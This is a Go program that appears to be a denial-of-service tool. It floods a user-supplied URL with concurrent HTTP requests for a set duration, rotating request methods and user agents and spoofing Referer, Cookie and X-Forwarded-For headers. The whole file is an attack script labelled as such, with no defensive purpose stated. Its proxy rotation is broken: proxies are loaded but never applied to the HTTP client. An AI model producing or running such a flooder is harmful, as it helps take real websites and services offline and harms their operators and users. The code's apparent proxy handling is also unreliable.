package main

import (
	"bufio"
	"fmt"
	"net/http"
	"os"
	"time"
)

func main() {
	fmt.Println("Enter the target URL (e.g., http://example.com):")
	var targetURL string
	fmt.Scanln(&targetURL)

	fmt.Println("Enter the number of goroutines:")
	var numGoroutines int
	fmt.Scanln(&numGoroutines)

	fmt.Println("Enter the attack duration in seconds:")
	var duration int
	fmt.Scanln(&duration)

	// Load proxies from file
	proxies, err := loadProxies("proxy.txt")
	if err != nil {
		fmt.Println("Error loading proxies:", err)
		return
	}

	// Start the attack
	startAttack(targetURL, proxies, numGoroutines, time.Duration(duration)*time.Second)
}

func loadProxies(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var proxies []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		proxies = append(proxies, scanner.Text())
	}

	if err := scanner.Err(); err != nil {
		return nil, err
	}

	return proxies, nil
}

func startAttack(targetURL string, proxies []string, numGoroutines int, duration time.Duration) {
	fmt.Println("Starting attack...")

	for i := 0; i < numGoroutines; i++ {
		go func(i int) {
			proxy := proxies[i%len(proxies)]
			attack(targetURL, proxy, duration)
		}(i)
	}

	time.Sleep(duration)
	fmt.Println("Attack finished.")
}

func attack(targetURL string, proxy string, duration time.Duration) {
	client := &http.Client{
		Timeout: 10 * time.Second,
	}

	start := time.Now()

	userAgents := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
	}

	methods := []string{"GET", "POST", "HEAD", "OPTIONS"}

	for time.Since(start) < duration {
		method := methods[time.Now().Nanosecond()%len(methods)]
		req, _ := http.NewRequest(method, targetURL, nil)

		// Set random User-Agent
		userAgent := userAgents[time.Now().Nanosecond()%len(userAgents)]
		req.Header.Set("User-Agent", userAgent)

		// Set other headers
		req.Header.Set("Referer", "http://example.com")
		req.Header.Set("Cookie", "sessionid=randomvalue;")
		req.Header.Set("X-Forwarded-For", "8.8.8.8")

		resp, err := client.Do(req)
		if err != nil {
			fmt.Println("Error:", err)
			continue
		}
		fmt.Println("Response status:", resp.Status)
		resp.Body.Close()

		// Optional: reduce delay or remove it
		time.Sleep(10 * time.Millisecond)
	}
}
